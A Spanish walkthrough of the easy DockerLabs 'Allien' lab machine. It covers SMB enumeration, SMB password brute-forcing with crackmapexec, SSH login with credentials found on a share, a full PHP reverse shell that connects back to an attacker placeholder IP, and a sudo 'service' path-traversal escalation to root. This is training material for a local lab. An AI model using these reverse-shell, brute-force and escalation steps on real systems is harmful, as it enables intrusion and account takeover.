---
icon: flag
---

# Allien DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip allien.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh allien.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-07 12:15 EST
Nmap scan report for chat.chatme.dl (172.17.0.2)
Host is up (0.000017s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:a1:09:2d:be:05:58:1b:01:20:d7:d0:d8:0d:7b:a6 (ECDSA)
|_  256 cd:98:0b:8a:0b:f9:f5:43:e4:44:5d:33:2f:08:2e:ce (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Login
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SAMBASERVER, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-07T17:15:59
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.02 seconds
```

## enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Nov  7 12:18:48 2024

 =========================================( Target Information )=========================================

Target ........... 172.17.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.17.0.2 )=============================


[+] Got domain/workgroup name: ESEEMEB.DL


 =================================( Nbtstat Information for 172.17.0.2 )=================================

Looking up status of 172.17.0.2
        SAMBASERVER     <00> -         B <ACTIVE>  Workstation Service
        SAMBASERVER     <03> -         B <ACTIVE>  Messenger Service
        SAMBASERVER     <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        ESEEMEB.DL      <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        ESEEMEB.DL      <1d> -         B <ACTIVE>  Master Browser
        ESEEMEB.DL      <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ====================================( Session Check on 172.17.0.2 )====================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 172.17.0.2 allows sessions using username '', password ''                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 =================================( Getting domain SID for 172.17.0.2 )=================================
                                                                                                                                                             
Domain Name: ESEEMEB.DL                                                                                                                                      
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ====================================( OS information on 172.17.0.2 )====================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 172.17.0.2 from srvinfo:                                                                                                                 
        SAMBASERVER    Wk Sv PrQ Unx NT SNT EseEmeB Samba Server                                                                                             
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ========================================( Users on 172.17.0.2 )========================================
                                                                                                                                                             
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: usuario1 Name:   Desc:                                                                                        
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: usuario3 Name:   Desc: 
index: 0x3 RID: 0x3ec acb: 0x00000010 Account: administrador    Name:   Desc: 
index: 0x4 RID: 0x3e9 acb: 0x00000010 Account: usuario2 Name:   Desc: 
index: 0x5 RID: 0x3eb acb: 0x00000010 Account: satriani7        Name:   Desc: 

user:[usuario1] rid:[0x3e8]
user:[usuario3] rid:[0x3ea]
user:[administrador] rid:[0x3ec]
user:[usuario2] rid:[0x3e9]
user:[satriani7] rid:[0x3eb]

 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                                                             
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                        

        Sharename       Type      Comment
        ---------       ----      -------
        myshare         Disk      Carpeta compartida sin restricciones
        backup24        Disk      Privado
        home            Disk      Produccion
        IPC$            IPC       IPC Service (EseEmeB Samba Server)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                                                   
                                                                                                                                                             
//172.17.0.2/myshare    Mapping: OK Listing: OK Writing: N/A                                                                                                 
//172.17.0.2/backup24   Mapping: DENIED Listing: N/A Writing: N/A
//172.17.0.2/home       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_CONNECTION_REFUSED listing \*                                                                                                                      
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.17.0.2 )=============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 172.17.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] SAMBASERVER
        [+] Builtin

[+] Password Info for Domain: SAMBASERVER

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 ========================================( Groups on 172.17.0.2 )========================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ===================( Users on 172.17.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\ubuntu (Local User)                                                                                                                  
S-1-22-1-1001 Unix User\usuario1 (Local User)
S-1-22-1-1002 Unix User\usuario2 (Local User)
S-1-22-1-1003 Unix User\usuario3 (Local User)
S-1-22-1-1004 Unix User\satriani7 (Local User)
S-1-22-1-1005 Unix User\administrador (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-3519099135-2650601337-1395019858 and logon username '', password ''                                                 
                                                                                                                                                             
S-1-5-21-3519099135-2650601337-1395019858-501 SAMBASERVER\nobody (Local User)                                                                                
S-1-5-21-3519099135-2650601337-1395019858-513 SAMBASERVER\None (Domain Group)
S-1-5-21-3519099135-2650601337-1395019858-1000 SAMBASERVER\usuario1 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1001 SAMBASERVER\usuario2 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1002 SAMBASERVER\usuario3 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1003 SAMBASERVER\satriani7 (Local User)
S-1-5-21-3519099135-2650601337-1395019858-1004 SAMBASERVER\administrador (Local User)

 ================================( Getting printer info for 172.17.0.2 )================================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Thu Nov  7 12:19:08 2024
```

## SMB

Si indagamos en el `SMB` podremos ver varios recursos compartidos de la siguiente forma:

```shell
smbclient -L //<IP>/ -N
```

Info:

```
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        myshare         Disk      Carpeta compartida sin restricciones
        backup24        Disk      Privado
        home            Disk      Produccion
        IPC$            IPC       IPC Service (EseEmeB Samba Server)
Reconnecting with SMB1 for workgroup listing.
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

Vemos varios recursos, entre ellos, podremos acceder al recurso llamado `myshare` por anonimo de la siguiente forma:

```shell
smbclient //<IP>/myshare -N 
```

Listamos el recurso y veremos el archivo llamado `access.txt`:

```
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Oct  6 18:26:40 2024
  ..                                  D        0  Sun Oct  6 18:26:40 2024
  access.txt                          N      956  Sun Oct  6 02:46:26 2024

                82083148 blocks of size 1024. 60663792 blocks available
```

Nos lo descargamos.

```shell
get access.txt
```

Y si leemos su contenido veremos lo siguiente:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNhdHJpYW5pN0Blc2VlbWViLmRsIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3MjgxNjAzNzMsImV4cCI6MTcyODE2Mzk3MywiandrIjp7Imt0eSI6IlJTQSIsIm4iOiI2MzU4NTI5OTgwNzk4MDM4NzI2MjQyMzYxMjc2NTg2NjE3MzU1MzUyMTMxNjU0ODI2NDI1ODg4NDkzNTU1NDYxNTIyNTc1NTAwNjY0ODY2MDM4OTY4ODMwNTk4OTY0NjUxOTQ2NDEzMzU4OTI1MzU2OTM4MDQwMTE1MjQzMDg4MTg0NTg1MzQxMzY5NTQyNTgxNTQwOTc3MjMzMjU0MTQxNzQ5NzczNDQyODkwNjc3ODY2MjI3NzUyMzEzMzg2OTk1NzA1ODAxNzM0NjA2NDE1NjkyNTM5MjAyNzc5OTczMjczODgyNTc1NTUwMTIwMDc4NjUzNDc0MTU1MjMyMjkwMDAxNjM4NTIwMTExNTUyNjE1NDkwMjQyOTYyMDA4MjYxNDI4NzA0MjAxNjcwOTg0NDUyMjY1NzcwNyIsImUiOjY1NTM3fX0.bQhS5qLCv5bf3sy-oHS7ZGcqqjk3LqyJ5bv-Jw6DIIoSIkmBtiocq07F7joOeKRxS3roWdHEuZUMeHQfWTHwRH7pHqCIBVJObdvHI8WR_Gac_MPYvwd6aSAoNExSlZft1-hXJUWbUIZ683JqEg06VYIap0Durih2rUio4Bdzv68JIo_3M8JFMV6kQTHnM3CElKy-UdorMbTxMQdUGKLk_4C7_FLwrGQse1f_iGO2MTzxvGtebQhERv-bluUYGU3Dq7aJCNU_hBL68EHDUs0mNSPF-f_FRtdENILwF4U14PSJiZBS3e5634i9HTmzRhvCGAqY00isCJoEXC1smrEZpg
```

Si identificamos esto, veremos que es un `Base64`, decodificado seria de la siguiente forma:

```
{"alg":"RS256","typ":"JWT"}{"email":"satriani7@eseemeb.dl","role":"user","iat":1728160373,"exp":1728163973,"jwk":{"kty":"RSA","n":"63585299807980387262423612765866173553521316548264258884935554615225755006648660389688305989646519464133589253569380401152430881845853413695425815409772332541417497734428906778662277523133869957058017346064156925392027799732738825755501200786534741552322900016385201115526154902429620082614287042016709844522657707","e":65537}}B/.ʪM˫"ynà"`m*ӱ{)R޺tq.eCL|G"Tvd?0/ޚH

euQf!ܚN`;R*8HLWLy!%+/vm<LA(?.+O<oכBFSpB5OpԳIH~Q
 Mx="bd{/GNlц4+&[&Fi
```

Vemos que nos dice una informacion rara, pero detectamos varias cosas importantes entre ellas un correo y un nombre de usuario.

## Credenciales de satriani7

Por lo que intentaremos hacer fuerza bruta al usuario `satriani7` con `SMB` a ver si hay suerte.

```shell
crackmapexec smb <IP> -u satriani7 -p <WORDLIST>
```

Info:

```
SMB       172.17.0.2      445    SAMBASERVER   [+] SAMBASERVER\satriani7:50cent
```

Por lo que vemos nos saca unas credenciales.

Nos conectaremos con esas credenciales al `SMB` al recurso compartido que mas atrae llamado `backup24`.

```shell
smbclient //<IP>/backup24 -U satriani7
```

Metemos la contraseña y estariamos dentro, nos iremos a la siguiente ruta que es la que nos interesa:

```shell
cd Documents/Personal/
get credentials.txt
```

## Credenciales de administrador

Si vemos lo que contiene `credentials.txt` veremos lo siguiente:

```
# Archivo de credenciales

Este documento expone credenciales de usuarios, incluyendo la del usuario administrador.

Usuarios:
-------------------------------------------------
1. Usuario: jsmith
   - Contraseña: PassJsmith2024!

2. Usuario: abrown
   - Contraseña: PassAbrown2024!

3. Usuario: lgarcia
   - Contraseña: PassLgarcia2024!

4. Usuario: kchen
   - Contraseña: PassKchen2024!

5. Usuario: tjohnson
   - Contraseña: PassTjohnson2024!

6. Usuario: emiller
   - Contraseña: PassEmiller2024!
   
7. Usuario: administrador
    - Contraseña: Adm1nP4ss2024   

8. Usuario: dwhite
   - Contraseña: PassDwhite2024!

9. Usuario: nlewis
   - Contraseña: PassNlewis2024!

10. Usuario: srodriguez
   - Contraseña: PassSrodriguez2024!



# Notas:
- Mantener estas credenciales en un lugar seguro.
- Cambiar las contraseñas periódicamente.
- No compartir estas credenciales sin autorización.
```

Vemos unas credenciales bastante jugosas que son las siguientes:

```
User = administrador
Pass = Adm1nP4ss2024
```

Por lo que nos conectaremos mediante `ssh`.

```shell
ssh administrador@<IP>
```

Metemos la contraseña y veremos que estamos dentro:

```
administrador@172.17.0.2's password: 
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.11-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

$ whoami
administrador
```

Nos importaremos una shell con `python`.

```shell
script /dev/null -c bash
```

## Escalate user www-data

Si nos vamos a la siguiente ruta y vemos sus permisos, veremos que podemos crear lo que queramos en `html/`.

```shell
cd /var/www/
ls -la html/
cd html/
```

Veremos que tenemos todos los permisos para crear lo que queramos por lo que crearemos una `reverse shell` con `PHP` de la siguiente forma:

```shell
nano shell.php

#Dentro del nano

<?php
// Configura la dirección IP y el puerto de conexión
$ip = "<IP>";
$port = <PORT>;

// Intenta abrir una conexión de socket a la dirección y puerto especificados
$sock = fsockopen($ip, $port);
if ($sock) {
    // Si se conecta, inicia un proceso de shell y redirige los flujos de entrada, salida y error al socket
    $proc = proc_open("sh", array(
        0 => $sock, // Entrada estándar
        1 => $sock, // Salida estándar
        2 => $sock  // Error estándar
    ), $pipes);

    // Verifica si se inició el proceso
    if (is_resource($proc)) {
        // Espera a que el proceso termine
        proc_close($proc);
    }
    fclose($sock);
} else {
    echo "No se pudo establecer la conexión.";
}
?>
```

Lo guardamos y nos vamos al navegador poniendo lo siguiente, pero antes estando a la escucha:

```shell
nc -lvnp <PORT>
```

Y en la URL algo tal que asi:

```
URL = http://<IP>/shell.php
```

Y con esto tendremos una `shell` con el usuario `www-data`.

## Escalate Privileges

Sanitizamos la `shell` (TTY):

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on a75e760e805b:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on a75e760e805b:
    (ALL) NOPASSWD: /usr/sbin/service
```

Por lo que si hacemos lo siguiente seremos `root`.

```shell
sudo service ../../bin/bash
```

Con esto ya seremos `root`, por lo que habriamos terminado.
